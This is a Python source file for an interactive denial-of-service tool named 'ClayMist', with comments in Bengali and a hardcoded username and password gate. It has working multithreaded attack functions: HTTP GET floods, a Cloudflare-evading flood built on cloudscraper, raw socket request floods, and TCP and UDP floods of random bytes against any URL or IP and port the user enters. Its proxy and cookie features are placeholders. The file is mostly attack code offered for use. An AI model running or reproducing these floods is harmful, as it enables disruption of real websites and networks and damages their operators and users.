import os
import sys
import threading
import time
import datetime
import random
import socket
import ssl
import requests
import http
import getpass
from urllib.parse import urlparse
from sys import stdout

# --- CRITICAL IMPORTS (Safe Import Strategy) ---
try:
    from colorama import Fore, Style
except ImportError:
    # colorama না থাকলে fallback
    class Fore:
        RED = WHITE = MAGENTA = GREEN = YELLOW = BLUE = CYAN = RESET = ''
    class Style:
        BRIGHT = RESET_ALL = ''

try:
    import socks
except ImportError:
    socks = None

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

try:
    import httpx
except ImportError:
    httpx = None

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ImportError:
    webdriver = None
    Options = None

# --- GLOBAL VARIABLES INITIALIZATION ---
ua = []
proxies = []
cookieJAR = None
cookie = None
useragent = None
target_info = {} 

# --- UTILITIES ---

def load_useragents():
    global ua
    try:
        ua_file = './resources/ua.txt'
        if not os.path.exists("./resources"): os.makedirs("./resources")
        if not os.path.exists(ua_file):
            ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]
            return
        ua = [agent.strip() for agent in open(ua_file, 'r', encoding='utf-8').read().split('\n') if agent.strip()]
    except Exception:
        ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

def clear():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        remaining_seconds = (until - datetime.datetime.now()).total_seconds()
        if remaining_seconds > 0:
            stdout.flush()
            stdout.write(f"\r {Fore.MAGENTA}[*]{Fore.WHITE} Attack status => {remaining_seconds:.2f} sec left {Style.RESET_ALL}")
        else:
            stdout.flush()
            stdout.write(f"\r {Fore.GREEN}[*] Attack Done !                                   {Style.RESET_ALL}\n")
            return

def get_target(url):
    target = {}
    target['uri'] = urlparse(url).path if urlparse(url).path else "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
    return target

# --- INFO GETTERS & PROXY/COOKIE FUNCTIONS (Simplified) ---

def get_proxies():
    # ... Proxy loading logic here ...
    global proxies
    proxy_file = "./proxy.txt"
    if not os.path.exists(proxy_file): return False
    try:
        proxies = [p.strip() for p in open(proxy_file, 'r').readlines() if p.strip()]
        return True if proxies else False
    except Exception:
        return False

def get_proxylist(type):
    print(f"{Fore.YELLOW}[*] Fetching {type} proxies... (Placeholder) {Fore.RESET}")

def get_cookie(url):
    if webdriver is None:
        print(f"{Fore.RED}[!] Selenium/webdriver not available. Cannot collect cookies.{Fore.RESET}")
        return False
    print(f"{Fore.CYAN}[*] Navigating to {url} to get Cloudflare cookie... (Placeholder) {Fore.RESET}")
    return False 

def get_info_l7():
    stdout.write(f" {Fore.YELLOW}• URL      :{Fore.RESET} "); target = input()
    stdout.write(f" {Fore.YELLOW}• THREAD   :{Fore.RESET} "); thread = input()
    stdout.write(f" {Fore.YELLOW}• TIME(s)  :{Fore.RESET} "); t = input()
    return target, thread, t

def get_info_l4():
    stdout.write(f" {Fore.YELLOW}• IP       :{Fore.RESET} "); target = input()
    stdout.write(f" {Fore.YELLOW}• PORT     :{Fore.RESET} "); port = input()
    stdout.write(f" {Fore.YELLOW}• THREAD   :{Fore.RESET} "); thread = input()
    stdout.write(f" {Fore.YELLOW}• TIME(s)  :{Fore.RESET} "); t = input()
    return target, port, thread, t

# --- LAYER 7 ATTACK FUNCTIONS (Real HTTP/HTTPS Logic) ---

def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackRAW, args=(url, until)).start()
def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try: 
            requests.get(url, timeout=10)
        except: 
            pass

def LaunchCFB(url, th, t):
    if cloudscraper is None: return print(f"{Fore.RED}[!] 'cloudscraper' required for CFB.{Fore.RESET}")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        threading.Thread(target=AttackCFB, args=(url, until, scraper)).start()
def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try: 
            scraper.get(url, timeout=15)
        except: 
            pass

def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\nConnection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        threading.Thread(target=AttackSOC, args=(target, until, req)).start()
def AttackSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            if target['scheme'] == 'https':
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            
            for _ in range(10):
                s.send(str.encode(req))
            s.close()
        except:
            pass

# --- LAYER 4 ATTACK FUNCTIONS (Real Socket Logic) ---

def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        threading.Thread(target=flooder, args=(host, port, rand, until)).start()
def flooder(host, port, rand, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            sock.settimeout(4) 
            sock.connect((host, int(port)))
            while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
                try:
                    sock.send(rand) 
                except:
                    break
            sock.close()
        except:
            pass

def runsender(host, port, th, t, payload=None):
    if payload is None: payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=sender, args=(host, port, until, payload)).start()
def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port))) 
        except:
            sock.close()
            pass

# --- MENU FUNCTIONS (Fixed) ---

def title():
    title_text = f"""
{Fore.YELLOW} _______  ___      _______  __   __  __   __  ___   _______  _______ {Fore.RESET}
{Fore.CYAN}             ╔═════════╩═════════════════════════════════╩═════════╗{Fore.RESET}
{Fore.CYAN}             ║         Welcome To ClayMist         ║{Fore.RESET}
{Fore.CYAN}             ║           Type [help] to see the Commands           ║{Fore.RESET}
{Fore.CYAN}             ╚═════════════════════════════════════════════════════╝{Fore.RESET}
"""
    stdout.write(title_text)

def help_menu():
    clear(); title()
    stdout.write(f" {Fore.CYAN}              [ ClayMist Command List ]               {Fore.RESET}\n")
    stdout.write(f" {Fore.GREEN}layer7{Fore.RESET}  : Show all Layer 7 Attack methods\n")
    stdout.write(f" {Fore.GREEN}layer4{Fore.RESET}  : Show all Layer 4 Attack methods\n")
    stdout.write(f" {Fore.GREEN}tools{Fore.RESET}   : Show other useful tools\n")
    stdout.write(f" {Fore.GREEN}exit{Fore.RESET}    : Exit the tool\n")

def l7_menu():
    clear(); title()
    stdout.write(f" {Fore.CYAN}              [ Layer 7 Attack Methods ]               {Fore.RESET}\n")
    stdout.write(f" {Fore.GREEN}  CFB, PXCFB, CFSOC, HTTP2, PXHTTP2, GET, POST, HEAD, SOC, PXRAW, PXSOC{Fore.RESET}\n")

def l4_menu():
    clear(); title()
    stdout.write(f" {Fore.CYAN}              [ Layer 4 Attack Methods ]               {Fore.RESET}\n")
    stdout.write(f" {Fore.GREEN}  UDP, TCP{Fore.RESET}\n")

def tools_menu():
    clear(); title()
    stdout.write(f" {Fore.CYAN}              [ Tools ]               {Fore.RESET}\n")
    stdout.write(f" {Fore.GREEN}  GET_HTTP_PROXY, GET_SOCKS5_PROXY, GET_COOKIE{Fore.RESET}\n")

# --- AUTHENTICATION (FIXED) ---
def authenticate():
    
    CORRECT_USERNAME = "claymistcybervail"
    CORRECT_PASSWORD = "edwinthamsa"
    MAX_ATTEMPTS = 3
    attempts = 0

    while attempts < MAX_ATTEMPTS:
        stdout.write(f"\n {Fore.YELLOW}{Style.BRIGHT}[+] Tool Authentication Required{Fore.RESET}\n")
        stdout.write(f" {Fore.WHITE}• Username: {Fore.RESET}")
        username = input().strip()
        stdout.write(f" {Fore.WHITE}• Password{Fore.RESET}")
        try:
            # getpass ব্যবহার করে পাসওয়ার্ড লুকানো হবে
            password = getpass.getpass(" (Hidden): ").strip()
        except Exception:
            # যদি getpass কাজ না করে
            password = input(" (No Hide): ").strip()
        
        # ইউজারনেম এবং পাসওয়ার্ড যাচাই
        if username == CORRECT_USERNAME and password == CORRECT_PASSWORD:
            print(f"\n{Fore.GREEN}{Style.BRIGHT}[*] Authentication Successful! Welcome, {username}.{Fore.RESET}")
            return True
        
        # ভুল প্রমাণপত্র
        print(f"{Fore.RED}{Style.BRIGHT} WRONG CREDENTIALS. Attempt {attempts + 1}/{MAX_ATTEMPTS}.{Fore.RESET}")
        attempts += 1
        continue
    
    # সর্বোচ্চ অ্যাটেম্পট শেষ
    print(f"\n{Fore.RED}{Style.BRIGHT}[!] MAXIMUM ATTEMPTS REACHED. Exiting Tool.{Fore.RESET}")
    return False

# --- COMMAND HANDLER (Fixed Menu Logic) ---

def command():
    stdout.write(f"{Fore.BLUE}{Style.BRIGHT}╔═══[root@ClayMist]\n╚══> {Fore.RESET}")
    cmd = input().lower()
    
    # Menu Navigation Commands
    if cmd in ("cls", "clear"):
        clear(); title()
    elif cmd in ("help", "?"):
        help_menu()
    elif cmd in ("layer7", "l7"):
        l7_menu()
    elif cmd in ("layer4", "l4"):
        l4_menu()
    elif cmd == "tools":
        tools_menu()
    elif cmd == "exit":
        sys.exit()

    # Attack Commands
    elif cmd == "cfb":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchCFB(target, thread, t); timer.join()
    elif cmd == "get":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        LaunchRAW(target, thread, t); timer.join()
    elif cmd == "udp":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runsender, args=(target, port, thread, t)).start()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        timer.join()
    elif cmd == "tcp":
        target, port, thread, t = get_info_l4()
        threading.Thread(target=runflooder, args=(target, port, thread, t)).start()
        timer = threading.Thread(target=countdown, args=(t,)); timer.start()
        timer.join()
    
    # Tool Commands
    elif cmd == "get_http_proxy": get_proxylist("HTTP")
    elif cmd == "get_socks5_proxy": get_proxylist("SOCKS5")
    elif cmd == "get_cookie":
        stdout.write(f" {Fore.YELLOW}• URL      :{Fore.RESET} "); url = input()
        get_cookie(url)
    
    # Unknown Command
    else:
        stdout.write(f" {Fore.RED}[>]{Fore.RESET} Unknown command: '{cmd}'. type 'help' to see all commands.\n")

# --- MAIN EXECUTION BLOCK (Authentication Call) ---
if __name__ == '__main__':
    load_useragents()
    
    # প্রমাণীকরণ সফল না হলে এক্সিট করবে
    if not authenticate(): 
        sys.exit() 
    
    # প্রমাণীকরণ সফল হলে ইন্টার‍্যাক্টিভ মোড শুরু
    clear(); title()
    while True:
        try:
            command()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Exiting...{Fore.RESET}")
            break
        except Exception as e:
            print(f"{Fore.RED}[!] An unhandled error occurred: {e}{Fore.RESET}")
            time.sleep(1)